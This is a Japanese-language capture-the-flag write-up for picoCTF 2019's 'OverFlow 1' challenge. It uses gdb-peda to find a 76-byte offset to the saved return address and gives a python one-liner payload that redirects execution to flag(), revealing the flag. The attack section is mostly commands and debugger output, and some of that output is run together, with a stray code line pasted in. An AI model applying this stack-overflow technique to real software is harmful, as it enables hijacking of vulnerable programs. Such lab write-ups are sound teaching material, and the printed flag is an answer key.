# OverFlow 1

## 問題
> You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in /problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a on the shell server. Source.

## 解答

バッファオーバーフローしてリターンアドレスを`flag()`のアドレスに書き換えるだけ

```shell
$ gdb -q vuln                                                                            Reading symbols from vuln...                                                             (No debugging symbols found in vuln)                                                     gdb-peda$ disas main                                                                     Dump of assembler code for function main:                                                   0x0804869e <+0>:     lea    ecx,[esp+0x4]                                                0x080486a2 <+4>:     and    esp,0xfffffff0                                               0x080486a5 <+7>:     push   DWORD PTR [ecx-0x4]                                          0x080486a8 <+10>:    push   ebp                                                          0x080486a9 <+11>:    mov    ebp,esp                                                      0x080486ab <+13>:    push   ebx                                                          0x080486ac <+14>:    push   ecx                                                          0x080486ad <+15>:    sub    esp,0x10                                                     0x080486b0 <+18>:    call   0x8048520 <__x86.get_pc_thunk.bx>                            0x080486b5 <+23>:    add    ebx,0x194b                                                   0x080486bb <+29>:    mov    eax,DWORD PTR [ebx-0x4]                                      0x080486c1 <+35>:    mov    eax,DWORD PTR [eax]                                          0x080486c3 <+37>:    push   0x0                                                          0x080486c5 <+39>:    push   0x2                                                          0x080486c7 <+41>:    push   0x0                                                          0x080486c9 <+43>:    push   eax                                                          0x080486ca <+44>:    call   0x8048490 <setvbuf@plt>                                      0x080486cf <+49>:    add    esp,0x10                                                     0x080486d2 <+52>:    call   0x8048450 <getegid@plt>                                      0x080486d7 <+57>:    mov    DWORD PTR [ebp-0xc],eax                                      0x080486da <+60>:    sub    esp,0x4                                                      0x080486dd <+63>:    push   DWORD PTR [ebp-0xc]                                          0x080486e0 <+66>:    push   DWORD PTR [ebp-0xc]                                          0x080486e3 <+69>:    push   DWORD PTR [ebp-0xc]                                          0x080486e6 <+72>:    call   0x80484b0 <setresgid@plt>                                    0x080486eb <+77>:    add    esp,0x10                                                     0x080486ee <+80>:    sub    esp,0xc                                                      0x080486f1 <+83>:    lea    eax,[ebx-0x17d8]                                             0x080486f7 <+89>:    push   eax                                                          0x080486f8 <+90>:    call   0x8048460 <puts@plt>                                         0x080486fd <+95>:    add    esp,0x10                                                     0x08048700 <+98>:    call   0x804865f <vuln>                                             0x08048705 <+103>:   mov    eax,0x0                                                      0x0804870a <+108>:   lea    esp,[ebp-0x8]
   0x0804870d <+111>:   pop    ecx                                                          0x0804870e <+112>:   pop    ebx                                                          0x0804870f <+113>:   pop    ebp                                                          0x08048710 <+114>:   lea    esp,[ecx-0x4]                                                0x08048713 <+117>:   ret                                                              End of assembler dump.
gdb-peda$ pattern_create 1000 input                                                      Writing pattern of 1000 chars to filename "input"
gdb-peda$ r < input
Starting program: /mnt/c/Users/ToDo/CTF/Pwnable/picoCTF2019/OverFlow1/vuln < input
Give me a string and lets see what happens:
Woah, were jumping to 0x41344141 !

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x23 ('#')                                                                          EBX: 0x41413341 ('A3AA')
ECX: 0xffffffff                                                                          EDX: 0xf7fc1010 --> 0x0                                                                  ESI: 0xf7fbf000 --> 0x1d6d6c                                                             EDI: 0xf7fbf000 --> 0x1d6d6c                                                             EBP: 0x65414149 ('IAAe')                                                                 ESP: 0xffffc5a0 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4"...)
EIP: 0x41344141 ('AA4A')                                                                 EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)        [-------------------------------------code-------------------------------------]         Invalid $PC address: 0x41344141                                                          [------------------------------------stack-------------------------------------]
0000| 0xffffc5a0 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4"...)
0004| 0xffffc5a4 ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA"...)
0008| 0xffffc5a8 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%"...)
0012| 0xffffc5ac ("AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%K"...)
0016| 0xffffc5b0 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA"...)
0020| 0xffffc5b4 ("AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%"...)
0024| 0xffffc5b8 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%h"...)
0028| 0xffffc5bc ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A"...)
[------------------------------------------------------------------------------]         Legend: code, data, rodata, value                                                        Stopped reason: SIGSEGV                                                                  0x41344141 in ?? ()
gdb-peda$ pattern_search
Registers contain pattern buffer:
ECX+52 found at offset: 69
EBX+0 found at offset: 68
EBP+0 found at offset: 72
EIP+0 found at offset: 76
Registers point to pattern buffer:
[ESP] --> offset 80 - size ~203
Pattern buffer found at:
0x0804b348 : offset  488 - size   24 ([heap])
0xffff9a20 : offset   76 - size    4 ($sp + -0x2b80 [-2784 dwords])
0xffffc544 : offset   76 - size    4 ($sp + -0x5c [-23 dwords])
0xffffc550 : offset    0 - size 1000 ($sp + -0x50 [-20 dwords])
0xffffd397 : offset 31577 - size    5 ($sp + 0xdf7 [893 dwords])
0xffffd42a : offset 31577 - size    5 ($sp + 0xe8a [930 dwords])
0xffffd51c : offset 31577 - size    5 ($sp + 0xf7c [991 dwords])
0xffffd54d : offset 31577 - size    5 ($sp + 0xfad [1003 dwords])
0xffffd5ac : offset 31577 - size    5 ($sp + 0x100c [1027 dwords])
  1 from pwn import *                                                                    0xffffd605 : offset 31577 - size    5 ($sp + 0x1065 [1049 dwords])                       0xffffda1f : offset 31577 - size    5 ($sp + 0x147f [1311 dwords])                       0xffffda3c : offset 31577 - size    5 ($sp + 0x149c [1319 dwords])                       0xffffda5d : offset 31577 - size    5 ($sp + 0x14bd [1327 dwords])                       0xffffda84 : offset 31577 - size    5 ($sp + 0x14e4 [1337 dwords])                       0xffffdac9 : offset 31577 - size    5 ($sp + 0x1529 [1354 dwords])                       0xffffdb06 : offset 31577 - size    5 ($sp + 0x1566 [1369 dwords])                       0xffffdbde : offset 31577 - size    5 ($sp + 0x163e [1423 dwords])                       0xffffdd0f : offset 31577 - size    5 ($sp + 0x176f [1499 dwords])                       0xffffdd28 : offset 31577 - size    5 ($sp + 0x1788 [1506 dwords])                       0xffffded6 : offset 31577 - size    5 ($sp + 0x1936 [1613 dwords])                       0xffffdf14 : offset 31577 - size    5 ($sp + 0x1974 [1629 dwords])                       0xffffdf4a : offset 31577 - size    5 ($sp + 0x19aa [1642 dwords])                       0xffffdf87 : offset 31577 - size    5 ($sp + 0x19e7 [1657 dwords])                       0xffffdfc6 : offset 31577 - size    5 ($sp + 0x1a26 [1673 dwords])                       References to pattern buffer found at:                                                   0xffffc470 : 0x0804b348 ($sp + -0x130 [-76 dwords])                                      0xffffc474 : 0x0804b348 ($sp + -0x12c [-75 dwords])                                      0xffff9aa0 : 0xffffc544 ($sp + -0x2b00 [-2752 dwords])                                   0xffffc098 : 0xffffc544 ($sp + -0x508 [-322 dwords])                                     0xffffc528 : 0xffffc544 ($sp + -0x78 [-30 dwords])                                       0xf7e40061 : 0xffffd605 (/usr/lib/i386-linux-gnu/libc-2.29.so)
```

```shell
$ python -c "print('A'*76 + '\xe6\x85\x04\x08')" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}Segmentation fault (core dumped)
```

